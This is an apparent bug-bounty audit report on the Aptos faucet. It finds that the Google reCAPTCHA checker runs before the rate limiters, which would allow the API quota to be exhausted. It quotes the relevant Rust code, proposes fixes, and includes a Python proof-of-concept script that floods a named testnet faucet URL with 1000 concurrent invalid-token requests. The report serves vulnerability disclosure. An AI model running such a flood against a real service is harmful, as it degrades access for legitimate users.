# Audit Report

## Title
Google reCAPTCHA API Quota Exhaustion via Pre-Rate-Limit External API Calls in Faucet Service

## Summary
The Aptos faucet's Google Captcha checker makes external API calls to Google's reCAPTCHA verification endpoint before any rate limiting is applied, allowing attackers to exhaust the API quota through repeated requests with invalid captcha tokens.

## Finding Description

The Aptos faucet implements a checker system where each checker has an associated cost value that determines execution order. The faucet sorts checkers by cost in ascending order, executing lower-cost checkers first. [1](#0-0) 

The `GoogleCaptchaChecker` has a cost value of 10: [2](#0-1) 

However, the rate limiting checkers have significantly higher costs:
- `MemoryRatelimitChecker`: cost = 20 [3](#0-2) 
- `RedisRatelimitChecker`: cost = 100 [4](#0-3) 

This means the Google Captcha checker executes **before** any rate limiting is applied. In the `check()` function, the captcha checker makes an external API call to Google's reCAPTCHA endpoint for every request that passes basic header validation: [5](#0-4) 

Checkers are executed sequentially in cost order: [6](#0-5) 

**Attack Path:**
1. Attacker sends numerous requests to the faucet endpoint with arbitrary/invalid captcha tokens
2. Requests pass initial checks (IP blocklist, referer checks - all cost < 10)
3. `GoogleCaptchaChecker.check()` is invoked (cost = 10)
4. External POST request is made to Google reCAPTCHA API for each request
5. Rate limiting checks occur afterward (cost = 20, 100) but API quota is already consumed
6. Attacker can rotate IPs or use botnets to bypass IP-based protections
7. Google API quota is exhausted

This breaks the **Resource Limits invariant** (#9): "All operations must respect gas, storage, and computational limits" - in this case, external API quota limits are not being respected through proper rate limiting.

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per Aptos Bug Bounty criteria for the following reasons:

**Direct Impact:**
- **API Quota Exhaustion**: Google reCAPTCHA has daily/monthly quota limits. Exhaustion causes all legitimate captcha validations to fail.
- **Service Degradation**: Once quota is exhausted, the faucet cannot validate captchas, potentially requiring fallback to less secure validation or service shutdown.
- **Financial Cost**: If using a paid reCAPTCHA tier, quota exhaustion incurs additional costs.
- **Recovery Time**: Quota resets are time-based (daily/monthly), requiring operational intervention.

This falls under Medium severity as it constitutes "State inconsistencies requiring intervention" - the faucet service enters a degraded state requiring manual intervention to restore full functionality, but doesn't directly lead to fund loss or consensus violations.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: Attacker only needs to send HTTP requests with any captcha token value
2. **No Authentication Required**: Requests only need to pass basic header checks
3. **Easily Automated**: Simple script can send thousands of requests
4. **Distributed Attacks**: Botnets or VPNs can bypass IP blocklist
5. **No Cost to Attacker**: Making requests is free; only the faucet pays for API quota
6. **Observable Impact**: Attacker can verify success when legitimate users report captcha failures

**Attack Requirements:**
- Basic HTTP client
- Optional: Multiple IP addresses or VPN for IP rotation
- No insider access required
- No blockchain interaction needed

## Recommendation

**Primary Solution**: Reorder checker execution by adjusting cost values to ensure rate limiting occurs before external API calls.

Change `GoogleCaptchaChecker` cost from 10 to a value higher than rate limiters (e.g., 150):

```rust
// In crates/aptos-faucet/core/src/checkers/google_captcha.rs
fn cost(&self) -> u8 {
    150  // Changed from 10 to execute AFTER rate limiters
}
```

**Alternative Solutions:**

1. **Dedicated Pre-Captcha Rate Limiting**: Implement a lightweight rate limiter specifically for captcha verification:
```rust
// Add a new checker with very low cost (e.g., 5)
pub struct CaptchaRatelimitChecker {
    // Rate limit captcha checks independently
    requests_per_ip: HashMap<IpAddr, RateLimitState>,
}
```

2. **Cache Captcha Results**: Cache successful captcha verifications by token to avoid redundant API calls:
```rust
// Add caching in GoogleCaptchaChecker
pub struct CaptchaChecker {
    config: GoogleCaptchaCheckerConfig,
    verified_tokens: Arc<Mutex<LruCache<String, bool>>>,
}
```

3. **Client-Side Token Validation**: Add basic token format validation before API call to reject obviously invalid tokens.

**Recommended Fix**: Combine solutions 1 and 3 - implement dedicated pre-captcha rate limiting AND increase `GoogleCaptchaChecker` cost to execute after general rate limiters.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Google reCAPTCHA API Quota Exhaustion Attack
Demonstrates how repeated requests with invalid captcha tokens
consume Google API quota before rate limiting is applied.
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

FAUCET_URL = "http://faucet.testnet.aptoslabs.com/fund"  # Example URL
INVALID_TOKEN = "INVALID_CAPTCHA_TOKEN_" 

def send_faucet_request(request_id):
    """Send a single faucet request with invalid captcha token"""
    headers = {
        "COMPLETED_CAPTCHA_TOKEN": INVALID_TOKEN + str(request_id),
        "Content-Type": "application/json"
    }
    
    payload = {
        "receiver": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        "amount": 10000
    }
    
    try:
        response = requests.post(FAUCET_URL, json=payload, headers=headers, timeout=5)
        return {
            "id": request_id,
            "status": response.status_code,
            "response": response.text[:100]  # First 100 chars
        }
    except Exception as e:
        return {"id": request_id, "error": str(e)}

def main():
    """
    Execute quota exhaustion attack:
    1. Send many concurrent requests with invalid captcha tokens
    2. Each request triggers Google reCAPTCHA API call
    3. Rate limiting only applies AFTER API call
    4. Google quota gets exhausted
    """
    
    print("[*] Starting Google reCAPTCHA Quota Exhaustion PoC")
    print("[*] Target: Aptos Faucet Service")
    print("[*] Attack: Pre-rate-limit API calls")
    print()
    
    # Send 1000 requests concurrently
    num_requests = 1000
    num_threads = 50
    
    print(f"[*] Sending {num_requests} requests with {num_threads} concurrent threads...")
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = list(executor.map(send_faucet_request, range(num_requests)))
    
    # Analyze results
    success_count = sum(1 for r in results if "error" not in r)
    
    print(f"\n[+] Attack completed:")
    print(f"    - Requests sent: {num_requests}")
    print(f"    - Successful connections: {success_count}")
    print(f"    - Each request triggered Google reCAPTCHA API call BEFORE rate limiting")
    print(f"    - Estimated API quota consumed: {success_count} calls")
    print()
    print("[!] Impact: Google reCAPTCHA quota exhausted, legitimate users cannot verify")
    
if __name__ == "__main__":
    main()
```

**Expected Behavior (Vulnerable):**
- All 1000 requests reach `GoogleCaptchaChecker.check()` before rate limiting
- 1000 Google reCAPTCHA API calls are made
- Rate limiting only rejects requests AFTER API quota is consumed
- Quota exhaustion causes captcha validation to fail for legitimate users

**Expected Behavior (Fixed):**
- Rate limiter (cost < 10) rejects requests before captcha check
- Only a small number of requests reach `GoogleCaptchaChecker`
- Google API quota is preserved
- Service remains available for legitimate users

## Notes

This vulnerability is specific to the Aptos **faucet service**, not the core blockchain consensus or Move VM. However, it represents a valid security issue under the resource exhaustion category. The faucet is a critical component for testnet/devnet operation, and its unavailability impacts developer experience and network testing capabilities.

The root cause is the checker cost-based ordering system, which prioritizes "cheap" local checks over "expensive" external API calls, but fails to account for the need to rate-limit before making external calls that consume third-party quotas.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L141-143)
```rust
        // Sort Checkers by cost, where lower numbers is lower cost, and lower
        // cost Checkers are at the start of the vec.
        checkers.sort_by_key(|a| a.cost());
```

**File:** crates/aptos-faucet/core/src/checkers/google_captcha.rs (L77-87)
```rust
        let verify_result = reqwest::Client::new()
            .post(GOOGLE_CAPTCHA_ENDPOINT)
            // Google captcha API only accepts form encoded payload, lol
            .form::<VerifyRequest>(&VerifyRequest {
                secret: self.config.google_captcha_api_key.0.clone(),
                response: captcha_token.to_string(),
                remoteip: data.source_ip.to_string(),
            })
            .send()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError))?;
```

**File:** crates/aptos-faucet/core/src/checkers/google_captcha.rs (L123-125)
```rust
    fn cost(&self) -> u8 {
        10
    }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L104-106)
```rust
    fn cost(&self) -> u8 {
        20
    }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L337-339)
```rust
    fn cost(&self) -> u8 {
        100
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L263-266)
```rust
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
```
